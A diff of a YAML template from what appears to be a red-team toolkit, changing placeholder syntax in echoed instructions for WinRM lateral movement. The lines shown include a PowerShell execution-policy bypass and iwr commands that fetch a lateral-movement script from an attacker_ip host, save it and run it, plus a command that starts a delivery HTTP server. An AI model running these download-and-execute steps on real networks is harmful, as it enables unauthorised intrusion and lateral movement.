@@ -22,8 +22,8 @@ content: |
   echo '                      -----PowerShell-----                      '; \
   echo 'Without bypass: Open the created file lateral-movement-winrm.ps1 and paste in line by line into powershell'; \
   echo 'Preparation 1 (for save to disk only): powershell -ep bypass'; \
-  echo 'Deliver & save to disk: iwr -uri http://<%=$(esh variables/attacker_ip)%>:<%=$(esh variables/delivery_outbound_port)%>/lateral-movement-winrm.ps1 -Outfile <%=$(esh variables/delivery_path_windows)%>\lateral-movement-winrm.ps1'; \
-  echo 'Deliver, save to disk & execute: iwr -uri http://<%=$(esh variables/attacker_ip)%>/lateral-movement-winrm.ps1 -Outfile <%=$(esh variables/delivery_path_windows)%>\lateral-movement-winrm.ps1; <%=$(esh variables/delivery_path_windows)%>\lateral-movement-winrm.ps1'; \
+  echo 'Deliver & save to disk: iwr -uri http://{{ attacker_ip }}:{{ delivery_outbound_port }}/lateral-movement-winrm.ps1 -Outfile {{ delivery_path_windows }}\lateral-movement-winrm.ps1'; \
+  echo 'Deliver, save to disk & execute: iwr -uri http://{{ attacker_ip }}/lateral-movement-winrm.ps1 -Outfile {{ delivery_path_windows }}\lateral-movement-winrm.ps1; {{ delivery_path_windows }}\lateral-movement-winrm.ps1'; \
   echo 'Enter the session: Enter-PSSession <sessionId that is displayed>'; \
   echo '================================================================'; \
-   python <%=$(esh variables/templates_dir)%>/helper_scripts/startEnhancedHttpServer.py -p <%=$(esh variables/delivery_outbound_port)%> -d packstation/outbound
+  python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port }} -d packstation/outbound
